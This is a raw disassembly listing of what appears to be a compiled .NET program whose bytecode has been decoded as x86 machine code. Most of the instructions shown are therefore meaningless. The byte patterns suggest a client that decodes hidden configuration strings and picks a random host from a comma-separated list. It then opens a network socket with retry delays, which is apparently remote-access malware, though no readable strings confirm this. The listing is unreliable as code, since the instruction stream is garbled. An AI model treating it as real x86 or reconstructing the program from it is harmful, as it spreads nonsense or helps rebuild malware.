  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	c2 00 00             	ret    $0x0
  4028da:	70 80                	jo     0x40285c
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	45                   	inc    %ebp
  4028e2:	02 00                	add    (%eax),%al
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	f8                   	clc
  4028ec:	02 00                	add    (%eax),%al
  4028ee:	70 80                	jo     0x402870
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	ab                   	stos   %eax,%es:(%edi)
  4028f6:	03 00                	add    (%eax),%eax
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	bf 03 00 70 80       	mov    $0x80700003,%edi
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	d9 03                	flds   (%ebx)
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	33 04 00             	xor    (%eax,%eax,1),%eax
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	e6 04                	out    %al,$0x4
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	41                   	inc    %ecx
  402928:	17                   	pop    %ss
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	f4                   	hlt
  402932:	1e                   	push   %ds
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40293c:	1f                   	pop    %ds
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	5a                   	pop    %edx
  402946:	20 00                	and    %al,(%eax)
  402948:	70 80                	jo     0x4028ca
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	0d 21 00 70 80       	or     $0x80700021,%eax
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	11 21                	adc    %esp,(%ecx)
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	c4 21                	les    (%ecx),%esp
  4029a3:	00 70 28             	add    %dh,0x28(%eax)
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 ce 21 00       	add    $0x21ce72,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	ce                   	into
  402aa0:	21 00                	and    %eax,(%eax)
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 d0 21    	add    %esp,0x21d07216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
